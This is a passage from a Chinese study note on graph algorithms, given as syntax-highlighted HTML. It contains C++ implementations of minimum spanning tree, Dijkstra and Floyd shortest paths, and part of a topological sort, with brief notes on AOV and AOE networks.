class="hljs-built_in">GetEdges</span>(amGraph, edges);<br>    <span class="hljs-function">std::vector&lt;<span class="hljs-type">int</span>&gt; <span class="hljs-title">sub</span><span class="hljs-params">(amGraph.vexnum, <span class="hljs-number">0</span>)</span></span>;<br>      <br>    <span class="hljs-type">int</span> beginSub, endSub;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">const</span> <span class="hljs-keyword">auto</span> &amp;item: edges) &#123;<br>        beginSub = <span class="hljs-built_in">find</span>(sub, item.begin);<br>        endSub = <span class="hljs-built_in">find</span>(sub, item.end);<br>        <span class="hljs-keyword">if</span> (beginSub != endSub) &#123;<br>            sub[beginSub]=endSub;<br>            std::cout &lt;&lt; <span class="hljs-string">&quot;( &quot;</span> &lt;&lt; beginSub &lt;&lt; <span class="hljs-string">&quot;  &quot;</span> &lt;&lt; endSub &lt;&lt; <span class="hljs-string">&quot; )   &quot;</span> &lt;&lt; amGraph.vexs[beginSub] &lt;&lt; <span class="hljs-string">&quot; --&gt; &quot;</span><br>                      &lt;&lt; amGraph.vexs[endSub] &lt;&lt; <span class="hljs-string">&quot;  weight: &quot;</span>&lt;&lt;item.weight&lt;&lt; std::endl;<br>        &#125;<br>    &#125;<br>&#125;<br>      <br>       <br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-type">int</span> nodeNum;<br>    std::cout &lt;&lt; <span class="hljs-string">&quot;input your nodeNum: &quot;</span>;<br>    std::cin &gt;&gt; nodeNum;<br>    AMGraph amGraph&#123;<span class="hljs-number">0</span>, <span class="hljs-number">0</span>&#125;;<br>    <span class="hljs-built_in">CreatGraph</span>(amGraph, nodeNum);<br>    <span class="hljs-comment">//实现最小生树</span><br>    <span class="hljs-built_in">CreateMinimalSpanningTree</span>(amGraph);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br>      <br></code></pre></td></tr></table></figure><p>最小生成树，不一定唯一</p></li></ul></li></ol><h3 id="最短路径"><a href="#最短路径" class="headerlink" title="最短路径"></a>最短路径</h3><ul><li><p>迪杰斯特拉算法</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;vector&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;algorithm&gt;</span></span><br>  <br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MaxInt 32767   <span class="hljs-comment">//有向表的正无穷</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MVNum 100       <span class="hljs-comment">//最大定点数</span></span><br><span class="hljs-keyword">typedef</span> <span class="hljs-type">char</span> VerTexType;   <span class="hljs-comment">//定点的类型</span><br><span class="hljs-keyword">typedef</span> <span class="hljs-type">int</span> ArcType;      <span class="hljs-comment">//权值</span><br>  <br><span class="hljs-keyword">struct</span> <span class="hljs-title class_">AMGraph</span> &#123;<br>    VerTexType vexs[MVNum];   <span class="hljs-comment">//顶点表</span><br>    ArcType arcs[MVNum][MVNum];   <span class="hljs-comment">//邻接矩阵</span><br>    <span class="hljs-type">int</span> vexnum, arcnum;<span class="hljs-comment">//图的当前点数和边的数目</span><br>    <span class="hljs-built_in">AMGraph</span>(<span class="hljs-type">int</span> vex, <span class="hljs-type">int</span> arc) : <span class="hljs-built_in">vexnum</span>(vex), <span class="hljs-built_in">arcnum</span>(arc) &#123;&#125;<br>  <br>    <span class="hljs-built_in">AMGraph</span>() : <span class="hljs-built_in">vexnum</span>(<span class="hljs-number">0</span>), <span class="hljs-built_in">arcnum</span>(<span class="hljs-number">0</span>) &#123;&#125;<br>&#125;;<br>  <br>  <br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">CreatGraph</span><span class="hljs-params">(AMGraph &amp;amGraph, <span class="hljs-type">int</span> &amp;num)</span> </span>&#123;<br>    amGraph.vexnum = num;<br>    <span class="hljs-comment">//给节点赋值</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; num; ++i) &#123;<br>        amGraph.vexs[i] = i + <span class="hljs-string">&#x27;A&#x27;</span>;<br>    &#125;<br>    <span class="hljs-comment">//初始化，获得邻接矩阵</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; num; ++i) &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; num; ++j) &#123;<br>            std::cin &gt;&gt; amGraph.arcs[i][j];<br>            <span class="hljs-keyword">if</span> (amGraph.arcs[i][j] != MaxInt &amp;&amp; amGraph.arcs[i][j] != <span class="hljs-number">0</span>) &#123;<br>                amGraph.arcnum++;<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br>  <br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">CreatePairShortPath</span><span class="hljs-params">(AMGraph amGraph)</span> </span>&#123;<br>    <span class="hljs-function">std::vector&lt;<span class="hljs-type">int</span>&gt; <span class="hljs-title">sub</span><span class="hljs-params">(amGraph.vexnum)</span></span>;    <span class="hljs-comment">//该点对应最短路径的前驱</span><br>    <span class="hljs-function">std::vector&lt;<span class="hljs-type">int</span>&gt; <span class="hljs-title">weight</span><span class="hljs-params">(amGraph.vexnum)</span></span>; <span class="hljs-comment">//从最开始的点到各个点的路径</span><br>    <span class="hljs-function">std::vector&lt;<span class="hljs-type">bool</span>&gt; <span class="hljs-title">final</span><span class="hljs-params">(amGraph.vexnum)</span></span>;  <span class="hljs-comment">//存放是否遍历</span><br>  <br>    <span class="hljs-comment">//初始化</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; amGraph.vexnum; ++i) &#123;<br>        weight[i] = amGraph.arcs[<span class="hljs-number">0</span>][i];;<br>        sub[i] = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">final</span>[i] = <span class="hljs-literal">false</span>;<br>    &#125;<br>    <span class="hljs-comment">//针对第一个点</span><br>    weight[<span class="hljs-number">0</span>] = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">final</span>[<span class="hljs-number">0</span>] = <span class="hljs-literal">true</span>;<br>  <br>    <span class="hljs-type">int</span> min = MaxInt;<br>    <span class="hljs-type">int</span> minSub = <span class="hljs-number">0</span>;<span class="hljs-comment">//存放临时的最小的路径</span><br>    <span class="hljs-comment">//最短路径</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; amGraph.vexnum; ++i) &#123;<br>        min = MaxInt;<br>        <span class="hljs-comment">//找到到旁边一个点最近的路径</span><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; amGraph.vexnum; ++j) &#123;<br>            <span class="hljs-keyword">if</span> (min &gt; weight[j] &amp;&amp; !<span class="hljs-keyword">final</span>[j]) &#123;<br>                min = weight[j];<br>                minSub = j;<br>            &#125;<br>        &#125;<br>  <br>        <span class="hljs-keyword">final</span>[minSub] = <span class="hljs-literal">true</span>;<br>  <br>        <span class="hljs-comment">//测试3个节点的关系</span><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; amGraph.vexnum; ++j) &#123;<br>            <span class="hljs-keyword">if</span> (min + amGraph.arcs[minSub][j] &lt; weight[j] &amp;&amp; !<span class="hljs-keyword">final</span>[j]) &#123;<br>                weight[j] = min + amGraph.arcs[minSub][j];<br>                sub[j] = minSub;<br>            &#125;<br>        &#125;<br>  <br>    &#125;<br>  <br>  <br>    std::<span class="hljs-built_in">sort</span>(sub.<span class="hljs-built_in">begin</span>(), sub.<span class="hljs-built_in">end</span>(), [](<span class="hljs-type">int</span> a, <span class="hljs-type">int</span> b) &#123;<br>        <span class="hljs-keyword">return</span> a &lt; b;<br>    &#125;);<br>  <br>    std::cout&lt;&lt;<span class="hljs-string">&quot;\n\nthe shortest path:&quot;</span>&lt;&lt;std::endl;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; i &lt; amGraph.vexnum; ++i) &#123;<br>        std::cout &lt;&lt; amGraph.vexs[sub[i]] &lt;&lt; <span class="hljs-string">&quot; --&gt; &quot;</span> &lt;&lt; amGraph.vexs[i] &lt;&lt; <span class="hljs-string">&quot;   now, the weight is: &quot;</span> &lt;&lt; weight[i]&lt;&lt;std::endl;<br>    &#125;<br>  <br>&#125;<br>  <br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>    AMGraph amGraph;<br>    <span class="hljs-type">int</span> size;<br>    std::cout &lt;&lt; <span class="hljs-string">&quot;please input size: &quot;</span>;<br>    std::cin &gt;&gt; size;<br>    <span class="hljs-built_in">CreatGraph</span>(amGraph, size);<br>    <span class="hljs-built_in">CreatePairShortPath</span>(amGraph);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>弗洛伊德</p>  <figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;vector&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;algorithm&gt;</span></span><br>    <br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MaxInt 32767   <span class="hljs-comment">//有向表的正无穷</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MVNum 100       <span class="hljs-comment">//最大定点数</span></span><br><span class="hljs-keyword">typedef</span> <span class="hljs-type">char</span> VerTexType;   <span class="hljs-comment">//定点的类型</span><br><span class="hljs-keyword">typedef</span> <span class="hljs-type">int</span> ArcType;      <span class="hljs-comment">//权值</span><br>    <br><span class="hljs-keyword">struct</span> <span class="hljs-title class_">AMGraph</span> &#123;<br>    VerTexType vexs[MVNum];   <span class="hljs-comment">//顶点表</span><br>    ArcType arcs[MVNum][MVNum];   <span class="hljs-comment">//邻接矩阵</span><br>    <span class="hljs-type">int</span> vexnum, arcnum;<span class="hljs-comment">//图的当前点数和边的数目</span><br>    <span class="hljs-built_in">AMGraph</span>(<span class="hljs-type">int</span> vex, <span class="hljs-type">int</span> arc) : <span class="hljs-built_in">vexnum</span>(vex), <span class="hljs-built_in">arcnum</span>(arc) &#123;&#125;<br>    <br>    <span class="hljs-built_in">AMGraph</span>() : <span class="hljs-built_in">vexnum</span>(<span class="hljs-number">0</span>), <span class="hljs-built_in">arcnum</span>(<span class="hljs-number">0</span>) &#123;&#125;<br>&#125;;<br>    <br>    <br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">CreatGraph</span><span class="hljs-params">(AMGraph &amp;amGraph, <span class="hljs-type">int</span> &amp;num)</span> </span>&#123;<br>    amGraph.vexnum = num;<br>    <span class="hljs-comment">//给节点赋值</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; num; ++i) &#123;<br>        amGraph.vexs[i] = i + <span class="hljs-string">&#x27;A&#x27;</span>;<br>    &#125;<br>    <span class="hljs-comment">//初始化，获得邻接矩阵</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; num; ++i) &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; num; ++j) &#123;<br>            std::cin &gt;&gt; amGraph.arcs[i][j];<br>            <span class="hljs-keyword">if</span> (amGraph.arcs[i][j] != MaxInt &amp;&amp; amGraph.arcs[i][j] != <span class="hljs-number">0</span>) &#123;<br>                amGraph.arcnum++;<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br>    <br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">CreatePairShortPath</span><span class="hljs-params">(AMGraph amGraph)</span> </span>&#123;<br>    std::vector&lt;std::vector&lt;<span class="hljs-type">int</span>&gt;&gt; weight;<br>    std::vector&lt;std::vector&lt;<span class="hljs-type">int</span>&gt;&gt; sub;<br>    <span class="hljs-comment">//初始化</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; amGraph.vexnum; ++i) &#123;<br>        std::vector&lt;<span class="hljs-type">int</span>&gt; temSub;<br>        std::vector&lt;<span class="hljs-type">int</span>&gt; temWei;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; amGraph.vexnum; ++j) &#123;<br>            temWei.<span class="hljs-built_in">emplace_back</span>(amGraph.arcs[i][j]);<br>            temSub.<span class="hljs-built_in">emplace_back</span>(j);<br>        &#125;<br>        weight.<span class="hljs-built_in">emplace_back</span>(temWei);<br>        sub.<span class="hljs-built_in">emplace_back</span>(temSub);<br>    &#125;<br>    <br>    <span class="hljs-comment">//核心代码</span><br>    <span class="hljs-comment">//i:中间点</span><br>    <span class="hljs-comment">//j:出发点</span><br>    <span class="hljs-comment">//k:终点</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; amGraph.vexnum; ++i) &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; amGraph.vexnum; ++j) &#123;<br>            <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> k = <span class="hljs-number">0</span>; k &lt; amGraph.vexnum; ++k) &#123;<br>                <span class="hljs-keyword">if</span> (weight[j][k] &gt; weight[j][i] + weight[i][k]) &#123;<br>                    weight[j][k] = weight[j][i] + weight[i][k];<br>                    sub[j][k] = sub[j][i];<br>                &#125;<br>            &#125;<br>        &#125;<br>    &#125;<br>    <br>    <span class="hljs-comment">//A-&gt;D</span><br>    <span class="hljs-type">int</span> beginSub = <span class="hljs-number">0</span>, endSub = <span class="hljs-number">3</span>;<br>    std::cout &lt;&lt; <span class="hljs-string">&quot;path: &quot;</span> &lt;&lt; amGraph.vexs[beginSub] &lt;&lt; <span class="hljs-string">&quot;  -&gt;  &quot;</span> &lt;&lt; amGraph.vexs[endSub] &lt;&lt; std::endl<br>              &lt;&lt; <span class="hljs-string">&quot; and the weight is &quot;</span> &lt;&lt; weight[beginSub][endSub] &lt;&lt; std::endl;<br>    <span class="hljs-type">int</span> kSub=sub[beginSub][endSub];<br>    std::cout&lt;&lt;amGraph.vexs[beginSub];<br>    <span class="hljs-keyword">while</span> (kSub != endSub) &#123;<br>        std::cout&lt;&lt;<span class="hljs-string">&quot; -&gt; &quot;</span>&lt;&lt;amGraph.vexs[kSub];<br>        kSub=sub[kSub][endSub];<br>    &#125;<br>    std::cout&lt;&lt;<span class="hljs-string">&quot; -&gt; &quot;</span>&lt;&lt;amGraph.vexs[endSub]&lt;&lt;std::endl;<br>&#125;<br>    <br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>    AMGraph amGraph;<br>    <span class="hljs-type">int</span> size;<br>    std::cout &lt;&lt; <span class="hljs-string">&quot;please input size: &quot;</span>;<br>    std::cin &gt;&gt; size;<br>    <span class="hljs-built_in">CreatGraph</span>(amGraph, size);<br>    <span class="hljs-built_in">CreatePairShortPath</span>(amGraph);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure></li></ul><h2 id="有向无环图"><a href="#有向无环图" class="headerlink" title="有向无环图"></a>有向无环图</h2><ol><li><p><code>AOV</code>网 -&gt; 拓扑排序问题</p><p>使用一个有向图表示一个工程。定点表示活动 。使用弧长表示不同活动的先后关系</p></li><li><p><code>AOE</code>网 -&gt; 关键路径问题</p><p>使用弧表示活动，使用定点表示活动开始或者结束的事件</p></li></ol><h3 id="拓扑排序"><a href="#拓扑排序" class="headerlink" title="拓扑排序"></a>拓扑排序</h3><ol><li><p>用处：</p><p>所有的顶点都在拓扑序列当中则说明是没有环，反之有环</p></li><li><p>代码</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;vector&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;algorithm&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;memory&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;list&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stack&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MaxInt 32767   <span class="hljs-comment">//有向表的正无穷</span></span><br><span class="hljs-keyword">typedef</span> <span class="hljs-type">char</span> VerTexType;   <span class="hljs-comment">//定点的类型</span><br><span class="hljs-keyword">typedef</span> <span class="hljs-type">int</span> ArcType;      <span class="hljs-comment">//权值</span><br><br><span class="hljs-keyword">struct</span> <span class="hljs-title class_">AMGraph</span> &#123;<br>    std::vector&lt;VerTexType&gt; vexs; <span class="hljs-comment">//顶点表</span><br>    std::vector&lt;std::vector&lt;<span class="hljs-type">int</span>&gt;&gt; arcs; <span class="hljs-comment">//邻接矩阵</span><br>    <span class="hljs-type">int</span> vexnum, arcnum;<span class="hljs-comment">//图的当前点数和边的数目</span><br>    <span class="hljs-built_in">AMGraph</span>(<span class="hljs-type">int</span> vex, <span class="hljs-type">int</span> arc) : <span class="hljs-built_in">vexnum</span>(vex), <span class="hljs-built_in">arcnum</span>(arc) &#123;&#125;<br><br>    <span class="hljs-built_in">AMGraph</span>() : <span class="hljs-built_in">vexnum</span>(<span class="hljs-number">0</span>), <span class="hljs-built_in">arcnum</span>(<span class="hljs-number">0</span>) &#123;&#125;<br>&#125;;<br><br><span class="hljs-keyword">struct</span> <span class="hljs-title class_">Edge</span> &#123;<br>    VerTexType nextValue;<br>    <span class="hljs-type">int</span> sub;<br>&#125;;<br><br><span class="hljs-keyword">struct</span> <span class="hljs-title class_">AdjacencyList</span> &#123;<br>    std::list&lt;std::shared_ptr&lt;Edge&gt;&gt; nextPoint;<br>    VerTexType vex;<br>    <span class="hljs-type">int</span> in;<br>    <span class="hljs-built_in">AdjacencyList</span>():<span class="hljs-built_in">vex</span>(<span class="hljs-string">&#x27;0&#x27;</span>),<span class="hljs-built_in">in</span>(<span class="hljs-number">0</span>)&#123;&#125;<br>&#125;;<br><br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">CreatGraph</span><span class="hljs-params">(AMGraph &amp;amGraph, <span class="hljs-type">int</span> &amp;num)</span> </span>&#123;<br>    amGraph.vexnum = num;<br>    <span class="hljs-comment">//给节点赋值</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; num; ++i) &#123;<br>        amGraph.vexs.<span class="hljs-built_in">emplace_back</span>(i + <span class="hljs-string">&#x27;A&#x27;</span>);<br>    &#125;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; num; ++i) &#123;<br>        std::vector&lt;<span class="hljs-type">int</span>&gt; vec;<br>        amGraph.arcs.<span class="hljs-built_in">emplace_back</span>(vec);<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; num; ++j) &#123;<br>            <span class="hljs-type">int</span> tem;<br>            std::cin &gt;&gt; tem;<br>            amGraph.arcs[i].<span class="hljs-built_in">emplace_back</span>(tem);<br>            <span class="hljs-keyword">if</span>(tem!=<span class="hljs-number">0</span>&amp;&amp;tem!=MaxInt)&#123;<br>                amGraph.arcnum++;<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br><br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">CreateAdjacencyList</span><span class="hljs-params">(<span class="hljs-type">const</span> AMGraph &amp;amGraph, std::vector&lt;AdjacencyList&gt;&amp; adjacencyList)</span> </span>&#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; amGraph.vexnum; ++i) &#123;<br>        AdjacencyList tem;<br>        tem.vex=amGraph.vexs[i];<br>        adjacencyList.<span class="hljs-built_in">emplace_back</span>(tem);<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; amGraph.vexnum; ++j) &#123;<br>            <span class="hljs-keyword">if</span>(amGraph.arcs[i][j]!=<span class="hljs-number">0</span>&amp;&amp;amGraph.arcs[i][j]!=MaxInt)&#123;<br>                <span class="hljs-function">std::shared_ptr&lt;Edge&gt; <span class="hljs-title">pEdge</span><span class="hljs-params">(<span class="hljs-keyword">new</span> Edge)</span></span>;<br>                pEdge-&gt;sub=j;<br>                pEdge-&gt;nextValue=amGraph.vexs[j];<br>                adjacencyList[i].nextPoint.<span class="hljs-built_in">push_back</span>(pEdge);<br>            &#125;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; amGraph.vexnum; ++i) &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; amGraph.vexnum; ++j) &#123;<br>            <span class="hljs-keyword">if</span>(amGraph.arcs[i][j]!=<span class="hljs-number">0</span>)&#123;  <br>                adjacencyList[j].in++;<br>            &#125;<br>        &#125;<br>    &#125;<br><br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">SopologicalSort</span><span class="hljs-params">(std::vector&lt;AdjacencyList&gt;&amp; adjacencyLists)</span></span>&#123;<br>    std::stack&lt;AdjacencyList&gt; stack;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; adjacencyLists.<span class="hljs-built_in">size</span>(); ++i) &#123;<br>        <span class="hljs-keyword">if</span>(adjacencyLists[i].in==<span class="hljs-number">0</span>)&#123;<br>            stack.<span class="hljs-built_in">push</span>(adjacencyLists[i]);<br>        &#125;<br>    &#125;<br>    <span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">while</span>(!stack.<span 